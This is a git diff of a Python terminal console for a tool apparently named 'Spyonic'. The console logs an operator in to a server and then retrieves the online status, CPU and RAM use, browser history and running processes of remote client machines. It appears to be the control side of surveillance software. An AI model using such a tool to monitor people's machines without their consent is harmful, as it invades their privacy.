@@ -1,79 +1,225 @@
 from mod import admin
-import eel
-import os,sys
-import json
+import os
+from prettytable import PrettyTable
 # print(sys.argv)
-url = os.path.join(sys.path[0],'web')
-eel.init(url)
-# ip = input("Enter IP address of the server:")
-ip = '25.41.20.120'
+
+ip = input("Enter IP address of the server:")
+# ip = '25.41.20.120'
 # email = input('enter email: ')
-email = 'test'
 adm = admin(ip)
 
 
-
-@eel.expose
-def register(email,passwd):
-    print(email,passwd)
-    data = adm.register(email,passwd)
-    if data == True:
-        return 1
-    else:
-        return data
-
-@eel.expose
-def login(email,passwd):
-    data =adm.login(email,passwd)
-    if data == True:
-        return 1
-    else:
-        return data
-
-@eel.expose
-def checklogin():
-    print('checking login')
-    if adm.is_installed():
-        if adm.login() == True:
+def loggedin():
+    adm.login()
+    go = True
+    while go:
+        os.system('cls')
+        print('\t\t\t\tSpyonic\t\t\t\t')
+        print()
+        print()
+        print('Commands Available:')
+        print('1. Get info on all systems available')
+        print('2. Get info on system state ')
+        print("3. Get info on system's browser history")
+        print("4. Get info on running process on client")
+        print('5. Logout')
+        print("6. Exit")
+        ch = int(input("Enter your choice: "))
+        if ch == 1:
+            os.system('cls')
             adm.start()
-            print('redirecting')
-            return 1
+            data = adm.sender(None,'status')
+            print('Systems Available')
+            tb = PrettyTable()
+            tb.field_names = ['ID','Name','Status','OS','Last Online']
+            
+            # print('ID\t\tName\t\tstatus\t\tOS\t\tLast Online')
+            for i in data:
+                cont = []
+                if data[i]['status'] == 0:
+                    data[i]['status'] = 'Offline'
+                else:
+                    data[i]['status'] = 'Online'
+                cont.append(i)
+                if len(data) != 0:
+                    for j in data[i]:
+                        cont.append(data[i][j])
+                    tb.add_row(cont)
+                    print(tb)
+                    print()
+                    print()
+                    print('click enter to continue')
+                    input()
+                else:
+                    print('No devices found')
+                    input()
+        elif ch == 2:
+            os.system('cls')
+            adm.start()
+            cli = adm.sender(None,'status')
+            clients = {}
+            if len(cli) != 0:
+                print("Systems Available")
+                # print('Sno\t\tID\t\tName')
+                tb = PrettyTable()
+                tb.field_names = ['Sno','ID','Name']
+                h = 1
+                for i in cli:
+                    if cli[i]['status'] == 1:
+                        tb.add_row([h,i,cli[i]['name']])
+                        clients[h] = i
+                if len(clients) != 0:
+                    print(tb)
+                    print()
+                    print()
+
+                    id = int(input("Enter the serial NO: "))
+                    data = adm.sender(clients[id],'sendclient','status')
+                    os.system('cls')
+                    tb = PrettyTable()
+                    print('System Status')
+                    tb.field_names = ['CPU %','RAM Total','RAM %']
+                    # print('Cpu %\t\tRam Total\t\tRam%')
+                    tb.add_row([data['cpu'],data['ram']['total'],data['ram']['percent']])
+                    print(tb)
+                    print()
+                    print()
+                    print('click enter to continue')
+                    input()
+                else:
+                    print("No devices Online")
+                    input()
+            else:
+                print('No devices found')
+                input()
+        elif ch == 3:
+            os.system('cls')
+            adm.start()
+            cli = adm.sender(None,'status')
+            clients = {}
+            if len(cli) != 0:
+                tb = PrettyTable()
+                tb.field_names = ['Sno','ID','Name']
+                print('Systems Available')
+                h = 1
+                for i in cli:
+                    if cli[i]['status'] == 1:
+                        tb.add_row([h,i,cli[i]['name']])
+                        clients[h] = i
+                if len(clients) != 0:
+                    print(tb)
+                    print()
+                    print()
+
+                    id = int(input("Enter the serial NO: "))
+                    data = adm.sender(clients[id],'sendclient','history')
+                    # print('Date\t\tUrl')
+                    tb = PrettyTable()
+                    tb.field_names = ['Date','URL']
+                    print('Browser History')
+                    for i in data:
+                        tb.add_row([i,data[i]])
+                    print(tb)
+                    print()
+                    print()
+                    print('Click enter to continue')
+                    input()
+                else:
+                    print("No devices online")
+                    input()
+            else:
+                print('No devices Found')
+                input()
+        elif ch == 4:
+            os.system('cls')
+            adm.start()
+            cli = adm.sender(None,'status')
+            clients = {}
+            if len(cli) != 0:
+                tb = PrettyTable()
+                tb.field_names = ['Sno','ID','Name']
+                h = 1
+                for i in cli:
+                    if cli[i]['status'] == 1:
+                        tb.add_row([h,i,cli[i]['name']])
+                        clients[h] = i
+                if len(clients)!=0:
+                    print(tb)
+                    print()
+                    print()
+
+                    id = int(input("Enter the serial NO: "))
+                    data = adm.sender(clients[id],'sendclient','listprocess')
+                    # print('PID\t\tName\t\tStatus')
+                    tb = PrettyTable()
+                    tb.field_names = ['PID','Name','Status']
+                    print('Syster Processes')
+                    for i in data:
+                        tb.add_row([i,data[i][0],data[i][1]])
+                    print(tb)
+                    print()
+                    print()
+                    print('Click enter to continue')
+                    input()
+                else:
+                    print('No devices online')
+                    input()
+            else:
+                print('NO devices found')
+        elif ch == 5:
+            go = False
+            os.remove(os.path.join(os.path.dirname(__file__),'data.dat'))
+            reg()
+        elif ch == 6:
+            print('Exiting')
+            go = False
+            break
         else:
-            print('no redirect')
-            return 0
-    else:
-        return 0
-    # return 1
+            print('Invalid option')
+            input()
 
-@eel.expose
-def status():
-    adm.start()
-    data = adm.sender(None,'status')
-    for i in data:
-        if data[i]['status'] == 0:
-            data[i]['status'] = 'Offline'
+def reg():
+    
+    go = True
+    while go:
+        os.system('cls')
+        print('\t\t\t\tSpyonic\t\t\t\t')
+        print()
+        print()
+        print('1.Register')
+        print('2.Login')
+        print('3.Exit')
+        ch = int(input("Enter your choice:"))
+        if ch == 1:
+            em = input('Enter email: ')
+            passwd = input('Enter password: ')
+            chec = adm.register(em,passwd)
+            if chec == True:
+                print('Registerd,Restart the program')
+                go = False
+                loggedin()
+            else:
+                print('Couldnt register',chec)
+                input()
+        elif ch == 2:
+            em = input('Enter email: ')
+            passwd = input('Enter password: ')
+            chec = adm.login(em,passwd)
+            if chec == True:
+                print('logged in,Restart the program')
+                go = False
+                loggedin()
+            else:
+                print('Couldnt login',chec)
+                input()
+        elif ch == 3:
+            go = False
+            print('Exiting')
+            break
         else:
-            data[i]['status'] = 'Online'
-    data = json.dumps(data)
-    print(data)
-    return data
-# if adm.is_installed():
-    # eel.start('html/index.html',jinja_templates = 'html')
-    # adm.login()
-    # adm.start()
-    # comma = input('Enter command')
-    # print('command')
-    # data = adm.sender(None,'status')
-    # print('hmm')
-    # for i in data:
-        # print(data[i]['status'] )
-        # if data[i]['status'] == 1:
-            # print('hm')
-            # print(adm.sender(i,'sendclient','listprocess'))
+            print('Invalid option')
 
-# else:
-    # adm.login(email,'123')
-    # adm.start()
-    # eel.start('html/home.html',jinja_templates = 'html',mode=None)
-
-eel.start('html/home.html',jinja_templates = 'html')
+if adm.is_installed():
+    loggedin()
+else:
+    reg()
